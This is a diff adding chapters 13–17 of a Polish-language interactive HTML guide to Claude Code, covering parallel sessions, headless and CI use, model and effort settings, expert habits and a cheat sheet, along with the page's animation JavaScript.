+      <li>Pluginy łączą skille + agentów + hooki + MCP; udostępniaj je przez marketplace, gdy 2. repozytorium potrzebuje tej samej konfiguracji.</li>
+    </ul>
+  </div>
+</section>
+
+<!-- ============================ 13 ============================ -->
+<section class="chapter" id="par">
+  <div class="chap-head reveal"><div class="chap-num">13</div><div><h2>Praca równoległa i zadania długo działające</h2><span class="tag">od jednego agenta do małego zespołu</span></div></div>
+
+  <p class="reveal">Gdy jedna sesja już dobrze działa, kolejnym wąskim gardłem jesteś <em>Ty</em> czekający. Claude Code ma kilka
+  sposobów na uruchomienie więcej niż jednej rzeczy naraz. Pytanie, które je odróżnia: <b>kto trzyma plan?</b></p>
+
+  <figure class="fig wide" id="fig-par">
+    <div class="ftitle">▶ Wybierz właściwe narzędzie <span>kliknij scenariusz</span></div>
+    <div class="scen" id="par-scen"></div>
+    <div class="appr" id="par-appr"></div>
+    <div class="status" id="par-status">Każdy scenariusz podświetla podejście, które pasuje najlepiej.</div>
+    <figcaption>Dostępność się różni: zespoły agentów są eksperymentalne (<code>CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS=1</code>),
+      rutyny i widok agentów są w podglądzie badawczym, dynamiczne przepływy pracy wymagają płatnego planu albo dostępu do API / dostawcy chmury (na Pro włącz je w <code>/config</code>).</figcaption>
+  </figure>
+
+  <div class="scroll-x reveal">
+  <table class="mini">
+    <thead><tr><th>Podejście</th><th>Jak</th><th>Kto decyduje, co dalej</th></tr></thead>
+    <tbody>
+      <tr><td>Subagenci</td><td>„użyj subagentów do…”, <code>/subtask</code></td><td>Claude, tura po turze</td></tr>
+      <tr><td>Worktrees</td><td><code>claude -w feature-auth</code> — własny checkout pod <code>.claude/worktrees/</code></td><td>Ty, jedna sesja na każdy</td></tr>
+      <tr><td>Sesje w tle</td><td><code>/background</code>, <code>claude agents</code> (widok agentów), <kbd>Ctrl+B</kbd> dla zadań</td><td>Ty wysyłasz, sprawdzasz później</td></tr>
+      <tr><td>Zespoły agentów</td><td>Lider + koledzy ze wspólną listą zadań i wymianą wiadomości</td><td>Agent-lider</td></tr>
+      <tr><td>Dynamiczne przepływy pracy</td><td>Poproś o „workflow”</td><td>Skrypt napisany przez Claude</td></tr>
+      <tr><td><code>/batch</code></td><td>Dołączona skilla: dzieli dużą zmianę między subagentów w ich własnych worktrees</td><td>Claude, zgodnie ze skillą</td></tr>
+      <tr><td><code>/goal</code></td><td>„aż wszystkie testy przejdą” — wykonuje kolejne tury, aż sprawdzenie powie, że gotowe</td><td>Warunek ukończenia</td></tr>
+      <tr><td><code>/loop</code></td><td><code>/loop 5m check the deploy</code> — powtarza, dopóki sesja jest otwarta</td><td>Timer</td></tr>
+      <tr><td>Rutyny</td><td><code>/schedule</code> — uruchomienia w chmurze na cron, API albo zdarzenia GitHub, laptop zamknięty</td><td>Wyzwalacz</td></tr>
+    </tbody>
+  </table>
+  </div>
+
+  <div class="box usecase reveal"><span class="lbl">🧰 Przepływ pracy: trzy funkcje przed obiadem</span>
+    <ol>
+      <li><code>claude -w search</code>, <code>claude -w billing-fix</code>, <code>claude -w docs</code> w trzech kartach terminala — każda dostaje własny branch i pliki.</li>
+      <li>Zaplanuj każdą w plan mode, zatwierdź, przełącz na <code>auto</code> albo <code>acceptEdits</code>.</li>
+      <li>Ustaw hook <code>Notification</code>, by dostać pinga, gdy któraś Cię potrzebuje; przetwarzaj kolejkę.</li>
+      <li>Każda sesja otwiera własny PR; recenzuj przez <code>/code-review</code> w świeżej sesji.</li>
+    </ol>
+  </div>
+
+  <div class="box watch reveal"><span class="lbl">⚠️ Uwaga, pułapka</span>
+    <p>Równolegli agenci mnożą pracę przy <em>recenzji</em>, nie tylko wyjście. Dwie sesje edytujące te same pliki w jednym checkoucie
+    będą walczyć — izoluj przez worktrees. A więcej agentów kosztuje więcej tokenów: zwłaszcza zespoły agentów używają
+    osobnego kontekstu na każdego kolegę.</p>
+  </div>
+
+  <div class="box bullets reveal"><span class="lbl">📌 Celne spostrzeżenia</span>
+    <ul>
+      <li>Poboczna sprawa → subagent. Osobne funkcje → worktrees. Debata → zespół agentów. Ogromny sprawdzany krzyżowo fan-out → workflow; duża mechaniczna zmiana → <code>/batch</code>.</li>
+      <li>Jedź, aż gotowe → <code>/goal</code>. Odpytuj → <code>/loop</code>. Laptop zamknięty → rutyna przez <code>/schedule</code>.</li>
+    </ul>
+  </div>
+</section>
+
+<!-- ============================ 14 ============================ -->
+<section class="chapter" id="ci">
+  <div class="chap-head reveal"><div class="chap-num">14</div><div><h2>Tryb headless i CI</h2><span class="tag">Claude Code jako narzędzie uniksowe</span></div></div>
+
+  <p class="reveal"><code>claude -p "prompt"</code> uruchamia jedno zadanie nieinteraktywnie i wypisuje wynik. Wszystko,
+  czego się nauczyłeś, nadal działa — CLAUDE.md, skille, hooki, MCP — więc wpasowuje się w skrypty, sprawdzenia pre-commit i CI.</p>
+
+<pre class="reveal"><code># jednorazowe, wlej rurą, wypisz JSON
+git diff main | claude -p "review for bugs; reply as a list" --output-format json
+
+# wynik strukturalny walidowany względem schematu (korzeń musi być obiektem)
+claude -p "list TODOs" --output-format json \
+  --json-schema '{"type":"object","properties":{"todos":{"type":"array","items":{"type":"string"}}},"required":["todos"]}' \
+  | jq '.structured_output'
+
+# zamknięte dla CI: wylistowane narzędzia + odczyty / komendy tylko do odczytu; wszystko, co wymagałoby pytania, jest odmawiane
+claude -p "run the tests and fix failures" \
+  --permission-mode dontAsk --allowedTools "Read" "Edit" "Bash(npm test *)" \
+  --max-turns 20 --max-budget-usd 5
+
+# rozgałęzienie po plikach
+git ls-files -z 'src/*.js' | while IFS= read -r -d '' f; do   # * w gicie pasuje też przez /
+  claude -p "migrate $f from CommonJS to ESM, keep behavior" --allowedTools "Read" "Edit" </dev/null
+done                     # </dev/null: inaczej claude -p zje resztę listy plików ze stdin</code></pre>
+
+  <figure class="fig wide" id="fig-ci">
+    <div class="ftitle">▶ Zadanie recenzji PR <span>GitHub Actions + claude -p</span></div>
+    <div class="ctrl">
+      <button class="btn primary" data-act="run">▶ Otwórz PR</button>
+      <button class="btn bad" data-act="noallow">🙈 Zapomnij o allowliście</button>
+      <button class="btn" data-act="reset">↺ Reset</button>
+    </div>
+    <div class="ci" id="ci-box"></div>
+    <div class="status" id="ci-status">Zadanie działa w trybie dontAsk: tylko odczyty plus wcześniej zatwierdzone narzędzia.</div>
+    <figcaption>Oparte na <code>anthropics/claude-code-action@v1</code>. Uruchom <code>/install-github-app</code> raz: instaluje
+      aplikację, dodaje sekret i wypycha branch z plikami workflow, otwierając gotowy do stworzenia PR w Twojej przeglądarce;
+      po jego stworzeniu i scaleniu, <code>@claude</code> w komentarzu do issue albo PR
+      też wyzwala Claude. Workflow z <code>prompt</code> działa w trybie automatyzacji i zapisuje wyniki do
+      logu uruchomienia, chyba że prompt każe Claude opublikować, a ma narzędzie, które może skomentować.</figcaption>
+  </figure>
+
+  <div class="box geek reveal"><span class="lbl">🤓 Dla dociekliwych</span>
+    <p><code>--output-format stream-json</code> wysyła zdarzenia na bieżąco (dla dashboardów i botów).
+    <code>--bare</code> pomija automatyczne wykrywanie hooków, skilli, pluginów, MCP i CLAUDE.md dla powtarzalnych skryptów.
+    <code>--append-system-prompt</code> dodaje instrukcje. <code>-c -p</code> kontynuuje rozmowę w skrypcie. Dla
+    pełnej kontroli (callbacki zatwierdzania narzędzi, natywne obiekty) użyj <b>Agent SDK</b> w Pythonie albo TypeScript — to
+    ten sam silnik.</p>
+  </div>
+
+  <div class="box bullets reveal"><span class="lbl">📌 Celne spostrzeżenia</span>
+    <ul>
+      <li><code>-p</code> + <code>--output-format json|stream-json</code> + <code>--json-schema</code> dla maszyn.</li>
+      <li>CI: <code>--permission-mode dontAsk</code> + dokładna lista <code>--allowedTools</code> + <code>--max-turns</code>/<code>--max-budget-usd</code>.</li>
+      <li>GitHub: <code>/install-github-app</code>; uruchomienia w chmurze na harmonogram albo zdarzenia: rutyny.</li>
+    </ul>
+  </div>
+</section>
+
+<!-- ============================ 15 ============================ -->
+<section class="chapter" id="model">
+  <div class="chap-head reveal"><div class="chap-num">15</div><div><h2>Modele, wysiłek i koszt</h2><span class="tag">wydawaj myślenie tam, gdzie się liczy</span></div></div>
+
+  <p class="reveal">Dwa pokrętła decydują, jak mocno myśli Claude. <b>Model</b> (<code>/model</code>, <code>--model</code>,
+  <kbd>Option/Alt+P</kbd>) wybiera mózg; <b>poziom wysiłku</b> (<code>/effort</code>, <code>--effort</code>) wybiera, ile
+  rozumuje na krok: <code>low</code>, <code>medium</code>, <code>high</code>, <code>xhigh</code>, <code>max</code>.
+  Aliasy śledzą zalecaną wersję dla Twojego dostawcy: <code>haiku</code>, <code>sonnet</code>, <code>opus</code>,
+  <code>fable</code>, <code>best</code>; plus <code>opusplan</code> (Opus do planowania, Sonnet do wykonania) i
+  warianty <code>[1m]</code> dla okna 1M tokenów.</p>
+
+  <figure class="fig wide" id="fig-model">
+    <div class="ftitle">▶ Dopasuj pokrętło do zadania <span>heurystyki, nie benchmarki</span></div>
+    <div class="ctrl">
+      <label>Zadanie
+        <select id="md-task" aria-label="zadanie">
+          <option value="rename">zmiana nazwy zmiennej w 3 plikach</option>
+          <option value="feature" selected>implementacja funkcji z jasnego planu</option>
+          <option value="debug">debugowanie niestabilnego race condition</option>
+          <option value="arch">projekt nowej architektury / trudny refaktor</option>
+        </select></label>
+      <label><input type="checkbox" id="md-fast"> tryb fast</label>
+    </div>
+    <table class="mtab">
+      <tr><td>Sugerowane</td><td id="md-pick" style="font:800 14px var(--mono)"></td></tr>
+      <tr><td>Głębokość rozumowania</td><td><div class="hbar" id="md-depth"></div></td></tr>
+      <tr><td>Szybkość</td><td><div class="hbar b3" id="md-speed"></div></td></tr>
+      <tr><td>Zużycie tokenów</td><td><div class="hbar b2" id="md-cost"></div></td></tr>
+    </table>
+    <div class="status" id="md-status"></div>
+    <figcaption>Paski są jakościowe. Prawdziwe wartości domyślne: wysiłek to <code>high</code> w większości modeli (Opus 5.5 domyślnie ma
+      <code>medium</code>). Tryb fast uruchamia ten sam model Opus z szybszym wynikiem w wyższej cenie, nie mniejszy model.</figcaption>
+  </figure>
+
+  <div class="box nodumb reveal"><span class="lbl">❓ Nie istnieją głupie pytania</span>
+    <div class="qa">
+      <div class="q">P:</div><div>Jak zobaczyć, ile wydaję?</div>
+      <div class="a">O:</div><div><code>/usage</code> (alias <code>/cost</code>) pokazuje koszt sesji i limity planu;
+        <code>/context</code> pokazuje, co zapełnia okno; niestandardowy pasek statusu (<code>/statusline</code>) może pokazywać
+        model, % kontekstu i koszt cały czas.</div>
+      <div class="q">P:</div><div>Które dźwignie kosztu się liczą?</div>
+      <div class="a">O:</div><div>Kontekst liczy się tak samo jak model: koszty tokenów skalują się z rozmiarem kontekstu, więc czyszczenie
+        między zadaniami, szczupły CLAUDE.md, subagenci do ciężkiego czytania i mniej bezczynnych serwerów MCP — wszystko to obniża wydatki. Potem wybierz najmniejszy model i wysiłek, które
+        wystarczą, i podnoś je dla trudnych fragmentów.</div>
+    </div>
+  </div>
+
+  <div class="box bullets reveal"><span class="lbl">📌 Celne spostrzeżenia</span>
+    <ul>
+      <li>Model = który mózg; wysiłek = jak długo myśli. Podnoś oba tylko dla projektowania i trudnego debugowania.</li>
+      <li><code>opusplan</code>: mocne planowanie, tańsze wykonanie. Subagenci mogą używać <code>model: haiku</code> do szukania.</li>
+      <li>Obserwuj <code>/usage</code> i <code>/context</code>; higiena kontekstu to jedna z największych oszczędności.</li>
+    </ul>
+  </div>
+</section>
+
+<!-- ============================ 16 ============================ -->
+<section class="chapter" id="expert">
+  <div class="chap-head reveal"><div class="chap-num">16</div><div><h2>Nawyki eksperta i anty-wzorce</h2><span class="tag">różnica to głównie dyscyplina</span></div></div>
+
+  <p class="reveal">Eksperci nie znają sekretnych komend. Budują swoją konfigurację <em>z czasem</em>, każdy element wyzwolony przez
+  prawdziwą irytację, i trzymają sesje czyste. Oficjalna dokumentacja wylicza kolejność, w jakiej większość zespołów dodaje rzeczy:</p>
+  <div class="scroll-x reveal">
+  <table class="mini">
+    <thead><tr><th>Gdy to się zdarza…</th><th>…dodaj to</th></tr></thead>
+    <tbody>
+      <tr><td>Claude myli konwencję albo komendę dwa razy</td><td>Linijka w CLAUDE.md</td></tr>
+      <tr><td>Wciąż prosisz o krótsze / bardziej wyjaśnione odpowiedzi</td><td>Styl wyjścia (<code>/output-style</code>)</td></tr>
+      <tr><td>Wpisujesz ten sam prompt startowy ponownie</td><td>Skilla wywoływana przez użytkownika</td></tr>
+      <tr><td>Wklejasz ten sam playbook po raz trzeci</td><td>Skilla</td></tr>
+      <tr><td>Kopiujesz dane z karty przeglądarki, której Claude nie widzi</td><td>Serwer MCP</td></tr>
+      <tr><td>Poboczne zadanie zalewa czat wynikiem</td><td>Subagent</td></tr>
+      <tr><td>Coś musi się dziać za każdym razem</td><td>Hook</td></tr>
+      <tr><td>Drugie repozytorium potrzebuje tej samej konfiguracji</td><td>Plugin</td></tr>
+    </tbody>
+  </table>
+  </div>
+
+  <figure class="fig wide" id="fig-expert">
+    <div class="ftitle">▶ Gdzie jesteś na drabinie? <span>zaznacz, co już robisz</span></div>
+    <div class="two">
+      <div class="habits" id="ex-habits"></div>
+      <div class="ladder" id="ex-ladder"></div>
+    </div>
+    <div class="status" id="ex-status"></div>
+    <b style="font:800 13px var(--sans);display:block;margin-top:.8rem">Klinika anty-wzorców — kliknij objaw</b>
+    <div class="pat" id="ex-pat"></div>
+    <div class="status warn" id="ex-fix">Pięć wzorców porażki prosto z oficjalnych najlepszych praktyk.</div>
+    <figcaption>Twoje zaznaczenia są zapisane tylko w tej przeglądarce (localStorage), nigdy nigdzie nie wysyłane.</figcaption>
+  </figure>
+
+  <div class="box usecase reveal"><span class="lbl">🧰 Codzienna pętla eksperta</span>
+    <ol>
+      <li>Zacznij czysto: jedno zadanie na sesję, nazwaną (<code>claude -n billing-bug</code>).</li>
+      <li>Badaj w plan mode z plikami <code>@</code>; dla dużej pracy: wywiad → <code>SPEC.md</code>.</li>
+      <li>Daj linię mety (test / komenda / zrzut ekranu); przełącz na <code>acceptEdits</code> albo <code>auto</code>.</li>
+      <li>Steruj wcześnie przez <kbd>Esc</kbd>; cofaj złe ścieżki zamiast się z nimi spierać.</li>
+      <li>Zweryfikuj: testy, <code>/diff</code>, <code>/code-review</code> w świeżym kontekście. Commituj przy zielonym.</li>
+      <li>Zbieraj plon: zamień powtarzającą się korektę w linijkę CLAUDE.md, skillę albo hook. <code>/clear</code>.</li>
+    </ol>
+  </div>
+
+  <div class="box bullets reveal"><span class="lbl">📌 Celne spostrzeżenia</span>
+    <ul>
+      <li>Rozwijaj swoją konfigurację z prawdziwych wyzwalaczy; przycinaj CLAUDE.md bezlitośnie.</li>
+      <li>Sesje-śmietniki, niekończące się korekty, rozdmuchany CLAUDE.md, brak weryfikacji, nieograniczona eksploracja — pięciu zabójców.</li>
+      <li>Zawsze zamykaj pętlę: coś, co Claude może uruchomić, by udowodnić, że skończył.</li>
+    </ul>
+  </div>
+</section>
+
+<!-- ============================ 17 ============================ -->
+<section class="chapter" id="final">
+  <div class="chap-head reveal"><div class="chap-num">17</div><div><h2>Egzamin + ściągawka</h2><span class="tag">sprawdź, co zostało w głowie</span></div></div>
+
+  <p class="reveal">14 pytań. Każde testuje mechanizm z rozdziałów, nie tylko nazwę komendy.</p>
+
+  <div id="quiz"></div>
+  <div class="score" id="score">Wynik: 0 / 0</div>
+
+  <h3 class="reveal">Ściągawka</h3>
+  <div class="scroll-x reveal">
+  <table class="mini cheat">
+    <thead><tr><th>Komenda / plik</th><th>Co robi</th><th>Kiedy używać</th></tr></thead>
+    <tbody>
+      <tr><td>claude -c / -r / -n</td><td>Kontynuuje / wznawia / nazywa sesję</td><td>Powrót do pracy</td></tr>
+      <tr><td>/init, CLAUDE.md</td><td>Pamięć projektu ładowana co sesję</td><td>Komendy buildu, konwencje (&lt;200 linii)</td></tr>
+      <tr><td>.claude/rules/*.md</td><td>Reguły z zasięgiem po globach <code>paths:</code></td><td>Wskazówki specyficzne dla folderu lub języka</td></tr>
+      <tr><td>/memory</td><td>Edytuj załadowaną pamięć, przełącz automatyczną pamięć</td><td>Sprawdzanie, co Claude „wie”</td></tr>
+      <tr><td>Shift+Tab, /plan</td><td>Przełącz tryby / wejdź w plan mode</td><td>Badanie przed edycją</td></tr>
+      <tr><td>--permission-mode</td><td>default · acceptEdits · plan · auto · dontAsk · bypassPermissions</td><td>Wybór autonomii</td></tr>
+      <tr><td>/permissions</td><td>Reguły allow / ask / deny (deny → ask → allow)</td><td>Mniej pytań, twarde limity</td></tr>
+      <tr><td>/sandbox</td><td>Izolacja na poziomie OS dla Bash</td><td>Bezpieczniejsza autonomia na Twojej maszynie</td></tr>
+      <tr><td>/context, /usage</td><td>Siatka kontekstu / koszt i limity</td><td>Sesje robią się wolne albo drogie</td></tr>
+      <tr><td>/clear, /compact [focus]</td><td>Resetuje / podsumowuje kontekst</td><td>Między zadaniami / długie zadania</td></tr>
+      <tr><td>/btw</td><td>Pytanie z boku, nie dodane do historii</td><td>Szybkie sprawdzenia w trakcie zadania</td></tr>
+      <tr><td>Esc · Esc Esc · /rewind</td><td>Przerwij · cofnij kod/rozmowę</td><td>Zły kierunek, nieudany eksperyment</td></tr>
+      <tr><td>@plik, !cmd, Ctrl+V</td><td>Wzmianka pliku · uruchom shell · wklej obraz</td><td>Dostarczanie precyzyjnego kontekstu</td></tr>
+      <tr><td>.claude/skills/x/SKILL.md</td><td>Wielorazowa skilla, <code>/x</code></td><td>Powtarzalne playbooki</td></tr>
+      <tr><td>.claude/agents/x.md</td><td>Niestandardowy subagent</td><td>Izolowane badania, recenzje, role</td></tr>
+      <tr><td>settings.json → hooks</td><td>Kod przy zdarzeniach cyklu życia; exit 2 blokuje</td><td>Reguły, które muszą zawsze obowiązywać, formatowanie, alerty</td></tr>
+      <tr><td>claude mcp add, /mcp, .mcp.json</td><td>Zewnętrzne narzędzia (lokalny &gt; projekt &gt; użytkownik)</td><td>GitHub, bazy danych, przeglądarki, trackery</td></tr>
+      <tr><td>/plugin</td><td>Instaluje paczki z marketplace'ów</td><td>Dzielenie konfiguracji między repozytoriami</td></tr>
+      <tr><td>claude -w name</td><td>Sesja we własnym worktree gita</td><td>Równoległe funkcje</td></tr>
+      <tr><td>/goal · /loop · /schedule</td><td>Aż gotowe · na interwał · rutyna w chmurze</td><td>Długa albo powtarzalna praca</td></tr>
+      <tr><td>claude -p … --output-format json</td><td>Uruchomienie headless</td><td>Skrypty, CI, rury</td></tr>
+      <tr><td>/model · /effort · /fast</td><td>Mózg · głębokość myślenia · szybszy wynik</td><td>Trudne vs rutynowe zadania</td></tr>
+      <tr><td>/code-review [ultra]</td><td>Recenzja diffa / głęboka wieloagentowa recenzja w chmurze</td><td>Przed scaleniem</td></tr>
+      <tr><td>/doctor, /release-notes</td><td>Diagnoza konfiguracji / co się zmieniło</td><td>Coś wygląda nie tak</td></tr>
+    </tbody>
+  </table>
+  </div>
+
+  <div class="box relax reveal"><span class="lbl">🎓 Gratulacje</span>
+    <p>Przeszedłeś od „co to jest agent” przez kontekst, pamięć, uprawnienia, planowanie, prompting i cofanie, do skilli,
+    subagentów, hooków, MCP, sesji równoległych, CI i wyboru modelu. Spójrz na listę zmartwień, którą napisałeś w rozdziale 0: złe
+    edycje (plan mode, weryfikacja, cofanie), skasowane pliki (uprawnienia, piaskownica, hooki, git), zapominanie (CLAUDE.md,
+    automatyczna pamięć, specyfikacje), rachunki (higiena kontekstu, wysiłek, budżety). Następny krok: wybierz jedną irytację z tego tygodnia i
+    dodaj dokładnie jeden element konfiguracji, który ją usunie. Powtarzaj co tydzień.</p>
+  </div>
+</section>
+</main>
+
+<footer>
+  Edukacyjny przewodnik w jednym pliku HTML — bez frameworków, bez kroku budowania, bez zależności sieciowych. Animacje: SVG,
+  HTML i IntersectionObserver. Fakty sprawdzono z oficjalną dokumentacją Claude Code (code.claude.com/docs) we
+  wrześniu 2026; funkcje często się zmieniają, więc ufaj <code>/release-notes</code> bardziej niż jakiejkolwiek statycznej stronie.
+  Claude i Claude Code są produktami Anthropic; ta strona jest niezależnym przewodnikiem.
+  · <a href="https://github.com/gbryk1/html-tools-local-llm" target="_blank" rel="noopener">Źródło na GitHubie</a>
+  · <a href="index.html">Inne narzędzia</a>
+</footer>
+<script>
+'use strict';
+/* ---------- helpers ---------- */
+const $ = (s, r = document) => r.querySelector(s);
+const $$ = (s, r = document) => [...r.querySelectorAll(s)];
+const REDUCE = matchMedia('(prefers-reduced-motion: reduce)').matches;
+const SVGNS = 'http://www.w3.org/2000/svg';
+const sleep = ms => new Promise(r => setTimeout(r, REDUCE ? 0 : ms));
+function S(tag, attrs = {}, parent) {
+  const e = document.createElementNS(SVGNS, tag);
+  for (const k in attrs) e.setAttribute(k, attrs[k]);
+  if (parent) parent.appendChild(e);
+  return e;
+}
+function T(parent, x, y, text, attrs = {}) {
+  const t = S('text', Object.assign({ x, y, 'text-anchor': 'middle' }, attrs), parent);
+  t.textContent = text;
+  return t;
+}
+function H(tag, cls, html, parent) {
+  const e = document.createElement(tag);
+  if (cls) e.className = cls;
+  if (html != null) e.innerHTML = html;
+  if (parent) parent.appendChild(e);
+  return e;
+}
+const ease = k => (k < .5 ? 2 * k * k : 1 - Math.pow(-2 * k + 2, 2) / 2);
+function tween(ms, fn) {
+  return new Promise(res => {
+    if (REDUCE || ms <= 0) { fn(1); return res(); }
+    const t0 = performance.now();
+    const step = t => {
+      const k = Math.min(1, (t - t0) / ms);
+      fn(ease(k));
+      if (k < 1) requestAnimationFrame(step); else res();
+    };
+    requestAnimationFrame(step);
+  });
+}
+function flyDot(parent, x0, y0, x1, y1, { ms = 600, color, r = 5 } = {}) {
+  const c = S('circle', { cx: x0, cy: y0, r, class: 'fly' }, parent);
+  c.style.fill = color || C.accent;
+  return tween(ms, k => { c.setAttribute('cx', x0 + (x1 - x0) * k); c.setAttribute('cy', y0 + (y1 - y0) * k); }).then(() => c.remove());
+}
+const cssVar = n => getComputedStyle(document.documentElement).getPropertyValue(n).trim();
+const C = {};
+function readColors() { for (const k of ['ink', 'paper', 'paper2', 'mut', 'line', 'accent', 'accent2', 'ok', 'bad', 'warn', 'dim', 'card']) C[k] = cssVar('--' + k); }
+readColors();
+matchMedia('(prefers-color-scheme: dark)').addEventListener('change', readColors);
+function ringXY(cx, cy, r, f) { const a = f * 2 * Math.PI - Math.PI / 2; return [cx + r * Math.cos(a), cy + r * Math.sin(a)]; }
+
+/* ---------- scroll machinery ---------- */
+const bar = $('#progress');
+let ticking = false;
+addEventListener('scroll', () => {
+  if (ticking) return; ticking = true;
+  requestAnimationFrame(() => {
+    const h = document.documentElement.scrollHeight - innerHeight;
+    bar.style.transform = `scaleX(${h > 0 ? scrollY / h : 0})`;
+    document.body.classList.toggle('past-cover', scrollY > innerHeight * .8);
+    ticking = false;
+  });
+}, { passive: true });
+
+const revealIO = new IntersectionObserver(es => es.forEach(e => {
+  if (e.isIntersecting) { e.target.classList.add('shown'); revealIO.unobserve(e.target); }
+}), { threshold: 0.12 });
+$$('.reveal').forEach(el => revealIO.observe(el));
+
+const tocLinks = new Map($$('#toc a').map(a => [a.getAttribute('href').slice(1), a]));
+const tocIO = new IntersectionObserver(es => es.forEach(e => {
+  if (!e.isIntersecting) return;
+  tocLinks.forEach(a => a.classList.remove('active'));
+  const a = tocLinks.get(e.target.id); if (a) a.classList.add('active');
+}), { rootMargin: '-35% 0px -60% 0px' });
+$$('section.chapter').forEach(s => tocIO.observe(s));
+
+const figIO = new IntersectionObserver(es => es.forEach(e => {
+  const f = e.target._fig; if (!f) return;
+  if (e.isIntersecting) {
+    if (f.visible) return;
+    f.visible = true;
+    if (!f.seen) { f.seen = true; f.first && f.first(); }
+    f.enter && f.enter();
+  } else if (f.visible) {
+    f.visible = false; f.leave && f.leave();
+  }
+}), { threshold: 0.25 });
+function registerFig(el, api) { el._fig = api; figIO.observe(el); return api; }
+
+/* enqueue helper: serialize animation runs, drop excess clicks */
+function makeQueue() {
+  let queue = Promise.resolve(), pending = 0;
+  return fn => { if (pending >= 3) return; pending++; queue = queue.then(fn).catch(e => console.error(e)).finally(() => pending--); };
+}
+
+
+/* ---------- shared: stacked token bars ---------- */
+const TOK = { sys: '#6b7280', mem: '#1b6fa8', work: '#2f9e63', noise: '#c98a00', sum: '#8e44ad' };
+function paintBar(el, segs, cap) {
+  for (const s of segs) {
+    let d = el.querySelector(`[data-k="${s.k}"]`);
+    if (!d) { d = H('div', 'seg', null, el); d.dataset.k = s.k; }
+    d.style.width = Math.min(100, 100 * s.v / cap) + '%';
+    d.style.background = s.c;
+    d.textContent = s.v >= cap * 0.07 ? s.t : '';
+  }
+}
+const kfmt = v => v >= 1000 ? (v / 1000).toFixed(v >= 10000 ? 0 : 1) + 'K' : String(Math.round(v));
+function logLine(box, text, cls = '') {
+  const d = H('div', cls, null, box); d.textContent = text;
+  requestAnimationFrame(() => d.classList.add('shown'));
+  box.scrollTop = box.scrollHeight;
+  return d;
+}
+function say(el, html, cls = '') { el.className = 'status' + (cls ? ' ' + cls : ''); el.innerHTML = html; }
+
+/* ---------- cover ---------- */
+(() => {
+  const g = $('#cover-nodes');
+  const icons = ['📄', '🔍', '✏️', '🧪', '🪝', '🔌', '🕵️', '🌿'];
+  for (let i = 0; i < 8; i++) {
+    const [x, y] = ringXY(200, 200, 150, i / 8);
+    const c = S('circle', { cx: x, cy: y, r: 17 }, g);
+    c.style.fill = C.paper2; c.style.stroke = C.ink; c.style.strokeWidth = 3;
+    T(g, x, y + 6, icons[i], { 'font-size': 16 });
+  }
+  const cur = $('#cover-cursor');
+  if (!REDUCE) setInterval(() => { cur.style.opacity = cur.style.opacity === '0' ? '1' : '0'; }, 600);
+})();
+
+/* ---------- 1. pętla agenta ---------- */
+(() => {
+  const root = $('#fig-loop'), svg = $('#loop-svg'), log = $('#loop-log'), st = $('#loop-status');
+  const nCalls = $('#loop-calls'), nTurns = $('#loop-turns'), res = $('#loop-res');
+  const CX = 210, CY = 165;
+  const pos = { gather: ringXY(CX, CY, 118, 0), act: ringXY(CX, CY, 118, 1 / 3), verify: ringXY(CX, CY, 118, 2 / 3) };
+  S('circle', { cx: CX, cy: CY, r: 118, fill: 'none', class: 'edge', 'stroke-dasharray': '6 6' }, svg);
+  // strzałki kierunku na pierścieniu
+  [1 / 6, 1 / 2, 5 / 6].forEach(f => {
+    const [x, y] = ringXY(CX, CY, 118, f);
+    const t = T(svg, x, y + 5, '➜', { 'font-size': 16 });
+    t.setAttribute('transform', `rotate(${f * 360} ${x} ${y})`); t.style.fill = C.pen || C.accent2;
+  });
+  const nodes = {};
+  const meta = { gather: ['🔍 Zbierz kontekst', 'Grep · Glob · Read'], act: ['✏️ Podejmij działanie', 'Edit · Write · Bash'], verify: ['🧪 Zweryfikuj', 'Bash: testy, build'] };
+  for (const k in pos) {
+    const [x, y] = pos[k];
+    const g = S('g', { class: 'nd' }, svg);
+    S('rect', { x: x - 64, y: y - 26, width: 128, height: 52, rx: 10 }, g);
+    T(g, x, y - 5, meta[k][0], { 'font-size': 12.5 });
+    T(g, x, y + 13, meta[k][1], { 'font-size': 10, 'font-weight': 400, class: 'small' });
+    nodes[k] = g;
+  }
+  const mg = S('g', { class: 'nd' }, svg);
+  S('circle', { cx: CX, cy: CY, r: 42 }, mg);
+  T(mg, CX, CY - 2, '🧠 Claude', { 'font-size': 13 });
+  const modelTxt = T(mg, CX, CY + 15, 'myśli…', { 'font-size': 9.5, 'font-weight': 400 });
+  modelTxt.style.opacity = 0;
+  const chip = T(svg, CX, 318, '', { 'font-size': 12, 'font-family': 'ui-monospace,Menlo,monospace' });
+
+  let run = 0, calls = 0, turns = 0;
+  const enqueue = makeQueue();
+  function reset() {
+    run++; calls = turns = 0; log.innerHTML = ''; chip.textContent = '';
+    nCalls.textContent = '0'; nTurns.textContent = '0'; res.textContent = '—'; res.style.color = '';
+    Object.values(nodes).forEach(n => n.classList.remove('hot'));
+    say(st, 'Naciśnij ▶, by zobaczyć, jak Claude zbiera, działa i weryfikuje.');
+  }
+  async function step(my, stage, tool, out, cls) {
+    if (my !== run) return false;
+    turns++; nTurns.textContent = turns;
+    modelTxt.style.opacity = 1; await sleep(250); modelTxt.style.opacity = 0;
+    const [x, y] = pos[stage];
+    await flyDot(svg, CX, CY, x, y, { ms: 420, color: C.accent2 });
+    if (my !== run) return false;
+    Object.values(nodes).forEach(n => n.classList.remove('hot'));
+    nodes[stage].classList.add('hot', 'pulse'); setTimeout(() => nodes[stage].classList.remove('pulse'), 650);
+    chip.textContent = tool;
+    calls++; nCalls.textContent = calls;
+    logLine(log, '● ' + tool);
+    await sleep(380);
+    if (my !== run) return false;
+    logLine(log, '  ⎿ ' + out, cls);
+    await flyDot(svg, x, y, CX, CY, { ms: 320, color: C.accent });
+    return my === run;
+  }
+  const user = t => logLine(log, '> ' + t, 'u');
+  async function task(verify) {
+    const my = ++run;
+    reset(); run = my;
+    user('test logowania nie przechodzi — napraw go');
+    say(st, '<b>Zbierz:</b> poza CLAUDE.md i automatyczną pamięcią, Claude nie wie jeszcze nic o tym kodzie, więc szuka i czyta najpierw.');
+    if (!await step(my, 'gather', 'Grep("login", src/)', '3 trafienia w src/auth/')) return;
+    if (!await step(my, 'gather', 'Read(src/auth/login.test.ts)', 'oczekuje ważnej sesji do expiry')) return;
+    if (!await step(my, 'gather', 'Read(src/auth/session.ts)', 'isValid() używa now < expiresAt')) return;
+    say(st, '<b>Działaj:</b> hipoteza staje się edycją.');
